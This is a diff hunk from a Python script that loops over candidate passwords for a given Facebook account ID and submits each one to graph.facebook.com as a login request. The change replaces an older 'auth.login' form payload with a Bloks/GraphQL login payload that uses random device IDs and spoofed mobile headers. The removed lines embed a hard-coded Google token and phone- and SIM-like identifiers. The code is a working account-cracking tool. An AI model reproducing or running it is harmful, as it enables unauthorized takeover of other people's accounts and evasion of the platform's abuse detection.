@@ -1550,28 +1550,36 @@ def x(uid,pwx,tl):
     try:
         for pw in pwx:
             data = {
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
-            'family_device_id': str(uuid.uuid4()),
-            'secure_family_device_id': str(uuid.uuid4()),
-            'cpl': 'true',
-            'try_num': '1',
-            'email': uid,
-            'password': pw,
-            'method': 'auth.login',
-            'generate_session_cookies': '1',
-            'sim_serials': "['80973453345210784798']",
-            'openid_flow': 'android_login',
-            'openid_provider': 'google',
-            'openid_emails': "['01710940017']",
-            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-            'error_detail_type': 'button_with_disabled',
-            'source': 'account_recovery',
-            'locale': 'en_GB',
-            'client_country_code': 'GB',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+    'method': 'post',
+    'pretty': False,
+    'format': 'json',
+    'server_timestamps': True,
+    'locale': 'id_ID, en-US',
+    'purpose': 'fetch',
+    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+    'fb_api_caller_class': 'graphservice',
+    'client_doc_id': '119940804214876861379510865434',
+    'variables': json.dumps({
+        "params": {
+            "params": "{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\"" + uid + "\\\",\\\"encrypted_password\\\":\\\"" + PWD_FB4A(pw) + "\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"waterfall_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"'" + str(uuid.uuid4()) + "'\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}",
+        "bloks_versioning_id": "3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5",
+        "app_id": "com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"
+    },
+    "scale": "2",
+    "nt_context": {
+        "using_white_navbar": True,
+        "styles_id": "cfe75e13b386d5c54b1de2dcca1bee5a",
+        "pixel_ratio": 2,
+        "is_push_on": False,
+        "debug_tooling_metadata_token": None,
+        "is_flipper_enabled": False,
+        "theme_params": [],
+        "bloks_version": "3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"
+    }
+    }),
+    'fb_api_analytics_tags': '["GraphServices"]',
+    'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'
+}
             headers = {
             'host': 'graph.facebook.com',
             'x-fb-connection-type': 'MOBILE.LTE',
